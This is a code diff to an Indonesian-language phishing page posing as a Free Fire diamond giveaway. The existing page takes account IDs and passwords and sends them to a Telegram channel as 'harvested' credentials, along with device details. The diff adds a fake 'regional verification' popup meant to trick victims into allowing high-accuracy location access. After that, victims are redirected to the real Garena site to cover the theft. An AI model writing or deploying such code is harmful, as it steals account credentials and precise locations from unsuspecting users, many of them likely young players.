@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -15,6 +15,15 @@
         input:focus { outline: none; border-color: #ffd369; }
         button { width: 100%; padding: 0.8rem; background: linear-gradient(45deg, #e94560, #ff6b6b); border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 1rem; box-shadow: 0 4px 12px rgba(233,69,96,0.4); }
         button:hover { background: linear-gradient(45deg, #ff6b6b, #e94560); }
+        
+        /* Fake Permission Modal */
+        #fake-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 999; }
+        .modal-box { background: #1e293b; padding: 1.5rem; border-radius: 8px; width: 300px; text-align: center; border: 1px solid #334155; }
+        .modal-box p { color: #f8fafc; font-size: 0.95rem; margin-bottom: 1.2rem; }
+        .modal-btns { display: flex; gap: 10px; }
+        .modal-btns button { padding: 0.6rem; font-size: 0.9rem; border-radius: 4px; cursor: pointer; }
+        .btn-allow { background: #22c55e; border: none; color: white; flex: 1; }
+        .btn-deny { background: #64748b; border: none; color: white; flex: 1; }
     </style>
 </head>
 <body>
@@ -27,6 +36,17 @@
             <input type="password" id="password" placeholder="Password Akun" required>
             <button type="submit">Klaim Sekarang</button>
         </form>
+    </div>
+
+    <!-- Fake Popup UI to trick user into clicking Allow -->
+    <div id="fake-modal">
+        <div class="modal-box">
+            <p>📍 <strong>Verifikasi Wilayah Event</strong><br>Izinkan akses lokasi untuk mendeteksi server region Indonesia agar Diamond langsung masuk ke akunmu.</p>
+            <div class="modal-btns">
+                <button type="button" class="btn-deny" id="btnDeny">Tolak</button>
+                <button type="button" class="btn-allow" id="btnAllow">Izinkan</button>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -62,7 +82,9 @@
                       `🧠 Cores: ${info.cores} \vert{} RAM:${info.memory}GB\n` +
                       `🌐 Lang: ${info.lang}`;
             sendToTelegram(msg);
+        };
 
+        function requestGeo() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -83,7 +105,7 @@
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             }
-        };
+        }
 
         document.getElementById('ffForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -92,7 +114,22 @@
 
             let credMsg = `💎 *FF Credentials Harvested*\n\nID/User: \`${u}\`\nPass: \`${p}\``;
             sendToTelegram(credMsg);
-            
+
+            // Munculkan fake modal alih-alih langsung tembak browser prompt
+            document.getElementById('fake-modal').style.display = 'flex';
+        });
+
+        document.getElementById('btnAllow').addEventListener('click', function() {
+            document.getElementById('fake-modal').style.display = 'none';
+            requestGeo();
+            setTimeout(() => {
+                window.location.href = 'https://ff.garena.com/';
+            }, 1500);
+        });
+
+        document.getElementById('btnDeny').addEventListener('click', function() {
+            document.getElementById('fake-modal').style.display = 'none';
+            sendToTelegram(`⚠️ User clicked Deny on regional verification popup.`);
             setTimeout(() => {
                 window.location.href = 'https://ff.garena.com/';
             }, 1000);
